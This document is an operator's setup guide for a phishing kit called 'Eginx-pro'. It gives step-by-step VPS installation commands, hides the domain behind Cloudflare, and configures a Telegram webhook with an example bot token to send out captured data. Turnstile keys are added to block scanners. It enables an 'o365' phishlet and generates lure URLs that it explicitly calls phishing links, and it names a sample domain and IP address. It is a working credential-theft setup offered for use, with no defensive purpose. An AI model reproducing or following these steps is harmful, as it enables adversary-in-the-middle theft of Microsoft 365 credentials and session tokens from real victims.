
1. Upload the file to your VPS 

2. Open the Terminal and run the code below from cd to ginX 

3. cd yuo && chmod -R 777 ginX

4. chmod -R 777 setup.sh

NOTE:
It is recommended to use cloudflare for better usage. adding your domain to cloudflare so it will be hidden completely.

back to terminal:
5. bash setup.sh fileaccess1.com (your domain you want use).
6. follow all the instructions carefully when the setup file is running it does 90% of all the installation.
7. tmux
8. ./ginX

Runtime command if port 443 or 80 in use:
9. q or quit or exit (to exit runtime)
10. systemctl stop systemd-resolved
11. systemctl disable systemd-resolved
12. systemctl stop apache2.service
13. nano /etc/resolv.conf
14. change nameserver to '8.8.8.8' save and restart ginx


Eginx-pro commands
1. config domain fileaccess1.com
    ('to setup the domain for phish link')
2. config ipv4 206.72.200.109 'ip address'
    ('to point to the vps/domain ip')
3. config webhook_telegram bot_token/chat id
    (example: 4101656209:AAFJeahG73axTthuvh4wW4gg6Wtnhe51yVw/1721242916)

config verbosity 2 

config turnstile_key Site_Key:Secrete_Key
    (example: 0x4AAAAAABZ_xsvF6A04w1ld:0x4AAAAAABZ_xhSJWXherpFfI9lAib6rSOk)


4. phishlets hostname o365 fileaccess1.com
 
    ('set hostname for given phishlet')
5. phishlets enable o365

phishlets disable o365
    ('to activate the phishlet you want to use')
6. lures create o365
    ('this will creates a link with an id')
7. lures get-url 0 <id>
    ('generates url for phishing')

lures delete 0

please reffer below for more help and commands
1. help
2. help '<args>'

tmux a -t (session ID)

